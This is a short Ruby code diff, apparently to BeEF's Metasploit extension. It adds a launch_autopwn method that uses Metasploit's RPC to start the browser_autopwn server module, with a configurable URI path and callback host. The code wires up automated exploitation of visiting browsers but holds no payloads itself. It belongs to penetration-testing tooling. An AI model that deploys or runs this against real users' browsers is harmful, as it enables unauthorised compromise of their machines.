@@ -20,6 +20,7 @@ module Metasploit
 			port = @config.get('beef.extension.metasploit.port')
 			@un = @config.get('beef.extension.metasploit.user')
 			@pw = @config.get('beef.extension.metasploit.pass')
+			@apurl = @config.get('beef.extension.metasploit.autopwn_url') || "autopwn"
       @lock = false
       
 			if(not host or not path or not port or not @un or not @pw)
@@ -187,6 +188,24 @@ module Metasploit
 
 			res['uri'] = uri
 			res
+		end
+
+		def launch_autopwn
+			return if not @enabled
+			opts = {
+				'LHOST' => @config.get('beef.extension.metasploit.callback_host') ,
+				'URIPATH' => @apurl
+				}
+      			get_lock()
+			begin
+				res = self.call('module.execute','auxiliary','server/browser_autopwn',opts)
+			rescue Exception => e
+				print_error "Failed to launch autopwn\n"
+        			release_lock()
+				return false
+			end
+      			release_lock()
+
 		end
 		
 	end
